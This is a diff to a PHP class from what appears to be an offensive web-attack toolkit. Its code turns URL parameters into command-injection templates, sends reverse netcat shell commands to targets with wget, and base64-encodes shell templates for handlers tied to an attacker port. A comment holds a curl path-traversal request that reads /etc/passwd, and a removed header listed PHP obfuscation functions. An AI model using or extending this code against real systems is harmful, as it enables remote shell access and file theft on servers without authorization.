@@ -1,45 +1,6 @@
 <?php
 
 
-/*
- /Windows/system.in
- /WINDOWS/ntusers.dat
-  * 
-  * 
-  * Obfuscation
-
-The following functions can be used to obfuscate the code.
-
-eval()
-assert()
-base64()
-gzdeflate()
-str_rot13()
-
-  
- Session ID Name Fingerprinting
-
-The name used by the session ID should not be extremely descriptive nor offer unnecessary details about the purpose and meaning of the ID.
-
-The session ID names used by the most common web application development frameworks can be easily fingerprinted [0], such as PHPSESSID (PHP), JSESSIONID (J2EE), CFID & CFTOKEN (ColdFusion), ASP.NET_SessionId (ASP .NET), etc.
- 
- JSESSIONID (Java EE), PHPSESSID (PHP), and ASPSESSIONID (Microsoft ASP). 
- 
- 
- 
- With the goal of implementing secure session IDs, the generation of identifiers (IDs or tokens) must meet the following properties:
-
-1) Session ID Name Fingerprinting - The name used by the session ID should not be extremely descriptive nor offer unnecessary details about the purpose and meaning of the ID.
-
-2) Session ID Length - The session ID must be long enough to prevent brute force attacks, where an attacker can go through the whole range of ID values and verify the existence of valid sessions. The session ID length must be at least 128 bits (16 bytes).
-
-3) Session ID Entropy - The session ID must be unpredictable (random enough) to prevent guessing attacks, where an attacker is able to guess or predict the ID of a valid session through statistical analysis techniques. The session ID value must provide at least 64 bits of entropy, if a good PRNG (Pseudo Random Number Generator) is used, this value is estimated to be half the length of the session ID.
-
-4) Session ID Content - The session ID content (or value) must be meaningless to prevent information disclosure attacks, where an attacker is able to decode the contents of the ID and extract details of the user, the session, or the inner workings of the web application.
-
-REFERENCE: https://www.owasp.org/index.php
- */
-
 class PARAM4COM extends URL{
     var $null_byte;
     var $param ;
@@ -109,15 +70,16 @@ class PARAM4COM extends URL{
                 $cmd_rev_nc = $this->url2encode($cmd_rev_nc);
                 $url = $this->param2url($template, $cmd_rev_nc);
                 
-                if ($this->methode_http=="GET") $data = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$url\" -qO-  ";
-                if ($this->methode_http=="POST") $data = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$this->uri_path\" --data \"$this->param=$cmd_rev_nc\" -qO-  ";
-                // curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://10.60.10.161/administrator/alerts/alertConfigField.php
-                $template_rec = "wget --user-agent='$user_agent' --timeout=30 --tries=2 --no-check-certificate \"$template\" -qO-  ";               
-               
+                if ($this->methode_http=="GET") $template_rec = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$template_rec\" -qO-  ";
+                if ($this->methode_http=="POST") $template_rec = "wget --user-agent=\"$user_agent\" --timeout=30 --tries=2 --no-check-certificate \"$template_rec\" --data \"$this->param=$cmd_rev_nc\" -qO-  ";
+                
+                
+                $template_shell = str_replace("%CMD%", "%SHELL%", $template_rec);
+                $templateB64_shell = base64_encode($template_shell);
                 $this->port2shell(base64_encode($template_rec));
                 
                 $template_exec = str_replace("%CMD%", $cmd_rev_nc, $template_rec);
-                $this->service4lan($template_exec, base64_encode($data), $attacker_port, 'T');
+                $this->service4lan($template_exec, $templateB64_shell, $attacker_port, 'T',"server");
                 
                 
             }
@@ -138,6 +100,13 @@ class PARAM4COM extends URL{
     public function param2template($cmd,$filter){
         $this->ssTitre(__FUNCTION__);
         $url_template = "";
+        $cmd_exec = "$cmd";
+        $url_template = str_replace("$this->param=$this->value", "$this->param=%CMD%", $this->url);
+        $url = $this->param2url($url_template, $cmd_exec);
+        if (!empty($this->param2check($this->user2agent,$url,$filter))) {
+            return $url_template;
+        }
+        
         $cmd_exec = "; $cmd";
         $url_template = str_replace("$this->param=$this->value", "$this->param=".$this->url2encode("$this->value; ")."%CMD%", $this->url);
         $url = $this->param2url($url_template, $cmd_exec);
@@ -214,7 +183,8 @@ class PARAM4COM extends URL{
         $this->ssTitre(__FUNCTION__);
         $this->article("Test URL",$url);
          
-        $query = "wget --user-agent='$user2agent' --header=\"Referer: $user2agent\" \"$url\" --timeout=30 --tries=2 --no-check-certificate -qO- 2> /dev/null | strings  $filter ";
+        if ($this->methode_http==="GET") $query = "wget  \"$url\" --timeout=30 --tries=2 --no-check-certificate -qO- 2> /dev/null | strings  $filter "; // --user-agent='$user2agent' --header=\"Referer: $user2agent\"
+        if ($this->methode_http==="POST") $query = "wget  \"$url\" --timeout=30 --tries=2 --no-check-certificate -qO- 2> /dev/null | strings  $filter "; // --user-agent='$user2agent' --header=\"Referer: $user2agent\"
         //$query = "curl --silent --connect-timeout 10 --no-keepalive --retry 2 --user-agent '$user2agent' \"$url\"  $filter ";
         return $this->req_ret_str($query);
     }
